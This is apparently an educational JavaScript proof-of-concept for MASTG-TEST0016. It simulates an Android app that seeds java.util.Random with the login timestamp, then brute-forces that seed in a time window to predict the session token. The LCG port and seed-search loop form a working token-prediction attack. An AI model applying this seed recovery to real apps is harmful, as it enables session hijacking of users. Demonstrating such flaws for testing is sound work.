/* ─────────────────────────────────────────────────
   MASTG-TEST0016 PoC – Interactive Vulnerability Demo
   
   This JavaScript faithfully replicates the Android app's
   behaviour (register → login → profile with session token)
   and implements the seed-recovery brute-force attack to
   demonstrate why java.util.Random is insecure for tokens.
   ───────────────────────────────────────────────────── */

// ──────── java.util.Random port (48-bit LCG) ────────
class JavaRandom {
    static MULTIPLIER = 0x5DEECE66Dn;
    static ADDEND = 0xBn;
    static MASK = (1n << 48n) - 1n;

    constructor(seed) {
        // java.util.Random constructor: (seed ^ multiplier) & mask
        this.seed = (BigInt(seed) ^ JavaRandom.MULTIPLIER) & JavaRandom.MASK;
    }

    next(bits) {
        this.seed = (this.seed * JavaRandom.MULTIPLIER + JavaRandom.ADDEND) & JavaRandom.MASK;
        // arithmetic right shift produces signed 32-bit-like ints
        return Number(this.seed >> (48n - BigInt(bits)));
    }

    nextInt(bound) {
        if (bound <= 0) throw new Error("bound must be positive");
        // same algorithm as OpenJDK java.util.Random.nextInt(int)
        if ((bound & (bound - 1)) === 0) {
            return Number((BigInt(bound) * BigInt(this.next(31))) >> 31n);
        }
        let bits, val;
        do {
            bits = this.next(31);
            val = bits % bound;
        } while (bits - val + (bound - 1) < 0);
        return val;
    }
}

// ──────── Token generator (mirrors Login.generateSessionToken) ────────
const CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const TOKEN_LENGTH = 16;

function generateSessionToken(seed) {
    const rng = new JavaRandom(seed);
    let token = "";
    for (let i = 0; i < TOKEN_LENGTH; i++) {
        token += CHARSET[rng.nextInt(CHARSET.length)];
    }
    return token;
}

// ──────── App State ────────
const state = {
    credentials: null,      // { username, password }
    sessionToken: null,
    tokenSeed: null,        // the actual seed used (attacker doesn't know this)
    currentScreen: 'main'
};

// ──────── DOM Helpers ────────
const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => document.querySelectorAll(sel);

function showScreen(name) {
    $$('.phone-screen').forEach(s => s.classList.remove('active'));
    $(`#screen-${name}`).classList.add('active');
    state.currentScreen = name;
}

function showToast(msg) {
    const el = document.createElement('div');
    el.className = 'toast';
    el.textContent = msg;
    $('#toast-container').appendChild(el);
    setTimeout(() => el.remove(), 2600);
}

function log(msg, cls = 'log-dim') {
    const el = document.createElement('span');
    el.className = cls;
    el.textContent = msg;
    const container = $('#log-output');
    container.appendChild(el);
    container.scrollTop = container.scrollHeight;
}

function updateClock() {
    const now = new Date();
    $('#status-time').textContent =
        now.getHours().toString().padStart(2, '0') + ':' +
        now.getMinutes().toString().padStart(2, '0');
}
setInterval(updateClock, 30000);
updateClock();

// ──────── Screen: MainActivity ────────
$('#btn-register').addEventListener('click', () => {
    const u = $('#reg-username').value.trim();
    const p = $('#reg-password').value.trim();
    if (!u || !p) { showToast('Fill the Form'); return; }

    // saveCredentialsToFile equivalent
    state.credentials = { username: u, password: p };
    showToast('Credentials saved to file');
    log(`[APP] Saved credentials → credentials.txt  (Username: ${u} Password: ${p})`, 'log-warn');

    setTimeout(() => showScreen('login'), 400);
});

$('#btn-go-login').addEventListener('click', () => {
    showScreen('login');
});

// ──────── Screen: Login ────────
$('#login-back').addEventListener('click', () => showScreen('main'));

$('#btn-login').addEventListener('click', () => {
    const u = $('#login-username').value.trim();
    const p = $('#login-password').value.trim();

    if (!state.credentials) {
        showToast('Wrong Credential');
        log('[APP] Login failed — no credentials registered yet', 'log-error');
        return;
    }
    if (u !== state.credentials.username || p !== state.credentials.password) {
        showToast('Wrong Credential');
        log(`[APP] Login failed — invalid credentials for "${u}"`, 'log-error');
        return;
    }

    // createSession → generateSessionToken with current-time seed
    state.tokenSeed = Date.now();
    state.sessionToken = generateSessionToken(state.tokenSeed);

    log(`[APP] Login.checkCredentials() → true`, 'log-info');
    log(`[APP] Login.createSession() → token generated`, 'log-info');
    log(`[APP] Token stored in SharedPreferences("SessionPrefs")`, 'log-info');
    log(`[INTERNAL] Seed used (attacker does NOT see this): ${state.tokenSeed}`, 'log-warn');
    log(`[INTERNAL] Session token: ${state.sessionToken}`, 'log-warn');

    // Update profile screen
    $('#profile-user').textContent = u;
    $('#session-token-display').textContent = state.sessionToken;

    // Update attack panel
    $('#observed-token').value = state.sessionToken;
    $('#estimated-seed').value = state.tokenSeed;
    $('#btn-attack').disabled = false;
    $('#attack-status').textContent = 'READY';
    $('#attack-status').className = 'card-status';

    showToast('Session created');
    setTimeout(() => showScreen('profile'), 350);
});

// ──────── Screen: Profile ────────
$('#btn-logout').addEventListener('click', () => {
    log('[APP] Profile.clearSession() → token removed', 'log-info');
    state.sessionToken = null;
    state.tokenSeed = null;
    $('#session-token-display').textContent = '—';
    showToast('Logged out');
    showScreen('main');
    // Reset attack panel
    $('#observed-token').value = '';
    $('#estimated-seed').value = '';
    $('#btn-attack').disabled = true;
    $('#attack-status').textContent = 'IDLE';
    $('#attack-status').className = 'card-status';
});

// ──────── Attack: Seed Recovery ────────
$('#btn-attack').addEventListener('click', async () => {
    const token = $('#observed-token').value;
    const centerSeed = parseInt($('#estimated-seed').value, 10);
    const windowMs = parseInt($('#search-window').value, 10) || 2000;

    if (!token || isNaN(centerSeed)) return;

    // UI update
    $('#btn-attack').disabled = true;
    $('#btn-attack').textContent = '⏳ Running…';
    $('#attack-status').textContent = 'RUNNING';
    $('#attack-status').className = 'card-status running';
    $('#attack-progress').classList.remove('hidden');
    $('#results-placeholder').classList.add('hidden');
    $('#results-content').classList.add('hidden');
    $('#res-banner').className = 'result-banner';
    $('#res-banner').textContent = '';

    const wStart = centerSeed - windowMs;
    const wEnd = centerSeed + windowMs;
    const total = wEnd - wStart + 1;

    log('', 'log-dim');
    log('═══════════════════════════════════════════', 'log-info');
    log('[ATTACK] Seed Recovery Attack started', 'log-error');
    log(`[ATTACK] Target token: ${token}`, 'log-warn');
    log(`[ATTACK] Search window: [${wStart}, ${wEnd}] (${total} candidates)`, 'log-info');
    log('═══════════════════════════════════════════', 'log-info');

    const t0 = performance.now();
    let found = null;
    let tried = 0;

    // Process in batches to keep UI responsive
    const BATCH = 500;

    await new Promise((resolve) => {
        function processBatch(start) {
            const end = Math.min(start + BATCH, wEnd + 1);
            for (let s = start; s < end; s++) {
                tried++;
                if (generateSessionToken(s) === token) {
                    found = s;
                    break;
                }
            }

            // Update progress bar
            const pct = Math.min(100, Math.round((tried / total) * 100));
            $('#progress-fill').style.width = pct + '%';
            $('#progress-pct').textContent = pct + '%';
            $('#progress-label').textContent = `Scanning seed ${start}…`;

            if (found !== null || end > wEnd) {
                resolve();
                return;
            }
            requestAnimationFrame(() => processBatch(end));
        }
        processBatch(wStart);
    });

    const elapsed = ((performance.now() - t0) / 1000).toFixed(3);

    // Results
    $('#results-content').classList.remove('hidden');

    if (found !== null) {
        const predicted = generateSessionToken(found);
        const match = predicted === token;

        $('#res-seed').textContent = found;
        $('#res-predicted').textContent = predicted;
        $('#res-match').innerHTML = match
            ? '<span style="color:var(--success);font-weight:700">✅ MATCH — Token Predicted!</span>'
            : '<span style="color:var(--danger)">❌ Mismatch</span>';
        $('#res-tried').textContent = tried.toLocaleString();
        $('#res-time').textContent = elapsed + ' s';

        $('#res-banner').className = 'result-banner success-banner';
        $('#res-banner').textContent = '🔓 ATTACK SUCCESSFUL — Session token fully predicted!';
        $('#attack-status').textContent = 'SUCCESS';
        $('#attack-status').className = 'card-status success';

        log('', 'log-dim');
        log(`[RESULT] ✅ Seed recovered: ${found}`, 'log-success');
        log(`[RESULT] Predicted token : ${predicted}`, 'log-success');
        log(`[RESULT] Match: ${match}`, 'log-success');
        log(`[RESULT] Seeds tried: ${tried.toLocaleString()} in ${elapsed}s`, 'log-success');
        log('[RESULT] 🔓 Session hijack possible — attacker can forge valid tokens!', 'log-error');
    } else {
        $('#res-seed').textContent = 'Not found';
        $('#res-predicted').textContent = '—';
        $('#res-match').innerHTML = '<span style="color:var(--danger)">❌ No match in window</span>';
        $('#res-tried').textContent = tried.toLocaleString();
        $('#res-time').textContent = elapsed + ' s';

        $('#res-banner').className = 'result-banner fail-banner';
        $('#res-banner').textContent = 'Seed not found in window — try widening the range.';
        $('#attack-status').textContent = 'FAILED';
        $('#attack-status').className = 'card-status failed';

        log(`[RESULT] ❌ Seed not found after ${tried.toLocaleString()} candidates (${elapsed}s)`, 'log-error');
    }

    // Re-enable button
    $('#btn-attack').disabled = false;
    $('#btn-attack').textContent = '▶ Launch Seed Recovery';
});

// ──────── Reset ────────
$('#btn-reset').addEventListener('click', () => {
    // Reset state
    state.credentials = null;
    state.sessionToken = null;
    state.tokenSeed = null;

    // Reset forms
    $('#reg-username').value = '';
    $('#reg-password').value = '';
    $('#login-username').value = '';
    $('#login-password').value = '';

    // Reset screens
    showScreen('main');

    // Reset attack panel
    $('#observed-token').value = '';
    $('#estimated-seed').value = '';
    $('#search-window').value = '2000';
    $('#btn-attack').disabled = true;
    $('#btn-attack').textContent = '▶ Launch Seed Recovery';
    $('#attack-status').textContent = 'IDLE';
    $('#attack-status').className = 'card-status';
    $('#attack-progress').classList.add('hidden');
    $('#progress-fill').style.width = '0%';
    $('#progress-pct').textContent = '0%';
    $('#results-placeholder').classList.remove('hidden');
    $('#results-content').classList.add('hidden');
    $('#res-banner').className = 'result-banner';
    $('#session-token-display').textContent = '—';

    // Clear log
    $('#log-output').innerHTML = '<span class="log-info">[INFO] System reset. Waiting for session token…</span>';
});

$('#btn-clear-log').addEventListener('click', () => {
    $('#log-output').innerHTML = '<span class="log-info">[INFO] Log cleared.</span>';
});

// ──────── Boot message ────────
log('[SYSTEM] PoC Demo loaded — simulating com.example.mastg_test0016', 'log-info');
log('[SYSTEM] Register a user, then login to generate a session token.', 'log-info');
log('[SYSTEM] The attack panel will brute-force the java.util.Random seed.', 'log-info');
